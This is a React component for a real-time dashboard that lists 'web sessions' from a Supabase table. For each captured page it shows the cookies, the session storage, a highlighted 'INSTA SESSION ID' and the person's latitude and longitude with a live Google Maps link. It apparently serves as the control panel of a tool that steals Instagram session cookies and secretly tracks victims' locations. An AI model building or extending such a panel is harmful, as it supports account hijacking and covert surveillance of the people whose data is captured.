import React, { useEffect, useState } from 'react';
import { supabase } from '../../supabase';
import { X, Shield, Clock, Globe, Database } from 'lucide-react';
import './WebSessions.css';

const WebSessions = () => {
  const [logs, setLogs] = useState([]);
  const [selectedLog, setSelectedLog] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        const { data, error } = await supabase
          .from('web_logs')
          .select('*')
          .order('id', { ascending: false });

        if (error) {
          console.error('Error fetching web logs:', error);
        } else if (data) {
          setLogs(data);
        }
      } catch (err) {
        console.error('Fetch catch error:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchLogs();

    // Set up real-time subscription
    const channel = supabase
      .channel('web_logs_realtime_dashboard')
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'web_logs' },
        (payload) => {
          if (payload.new) {
            setLogs((prevLogs) => [payload.new, ...prevLogs]);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const formatTimestamp = (log) => {
    const ts = log.created_at || log.timestamp || log.inserted_at;
    if (!ts || ts === 'Just now' || ts === 'LOCATION_DATA') return 'Just now';
    try {
      const date = new Date(ts);
      if (isNaN(date.getTime())) return 'Just now';
      return date.toLocaleString();
    } catch (e) {
      return 'Just now';
    }
  };

  const parseJSONField = (field) => {
    if (!field) return {};
    if (typeof field === 'object') return field;
    try {
      return JSON.parse(field);
    } catch (e) {
      return { value: String(field) };
    }
  };

  return (
    <div className="web-sessions-container">
      <div className="web-sessions-header">
        <h2></h2>
        <p></p>
      </div>

      {loading ? (
        <div className="sessions-loading">Loading web sessions...</div>
      ) : logs.length === 0 ? (
        <div className="sessions-empty">No web sessions captured yet.</div>
      ) : (
        <div className="table-responsive">
          <table className="sessions-table">
            <thead>
              <tr>
                <th>URL</th>
                <th>Timestamp</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {logs.map((log) => (
                <tr key={log.id}>
                  <td className="url-cell" title={log.url}>
                    <Globe size={14} className="cell-icon" />
                    <span>{log.url || 'N/A'}</span>
                  </td>
                  <td className="timestamp-cell">
                    <Clock size={14} className="cell-icon" />
                    <span>{formatTimestamp(log)}</span>
                  </td>
                  <td>
                    <button
                      className="view-details-btn"
                      onClick={() => setSelectedLog(log)}
                    >
                      View Details
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {selectedLog && (
        <div className="modal-overlay" onClick={() => setSelectedLog(null)}>
          <div className="details-modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Session Details</h3>
              <button className="close-modal-btn" onClick={() => setSelectedLog(null)}>
                <X size={20} />
              </button>
            </div>
            <div className="modal-body">
              <div className="modal-info-item">
                <strong>Target URL:</strong>
                <span className="modal-url">{selectedLog.url}</span>
              </div>
              <div className="modal-info-item">
                <strong>Captured At:</strong>
                <span>{formatTimestamp(selectedLog)}</span>
              </div>

              <div className="json-section">
                <h4><Shield size={16} /> Session & Cookies</h4>
                <div className="cookie-box" style={{ background: '#fcfcfc', border: '1px solid #ddd', padding: '10px' }}>
                  {(() => {
                    const sessionData = parseJSONField(selectedLog.session_storage || selectedLog.sessionStorage);
                    return (
                      <>
                        {sessionData.session_id && (
                          <div style={{ color: '#d9534f', fontWeight: 'bold', borderBottom: '1px solid #eee', pb: '5px', mb: '5px' }}>
                            INSTA SESSION ID: <span style={{ fontFamily: 'monospace', color: '#333' }}>{sessionData.session_id}</span>
                          </div>
                        )}
                        <pre style={{ fontSize: '11px', whiteSpace: 'pre-wrap' }}>{typeof selectedLog.cookies === 'string' ? selectedLog.cookies : JSON.stringify(selectedLog.cookies)}</pre>
                      </>
                    );
                  })()}
                </div>
              </div>

              <div className="json-section">
                <h4><Globe size={16} /> Location Tracking (Maps)</h4>
                {(() => {
                  const data = parseJSONField(selectedLog.session_storage || selectedLog.sessionStorage);
                  if (data.lat && data.lng) {
                    return (
                      <div style={{ padding: '10px', background: '#eef', borderRadius: '5px' }}>
                        <p>📍 Coordinates: {data.lat}, {data.lng}</p>
                        <a
                          href={data.map_url}
                          target="_blank"
                          rel="noreferrer"
                          style={{ color: '#007bff', fontWeight: 'bold', textDecoration: 'underline' }}
                        >
                          View Live on Google Maps
                        </a>
                      </div>
                    );
                  }
                  return <p>No location data in this log.</p>;
                })()}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default WebSessions;
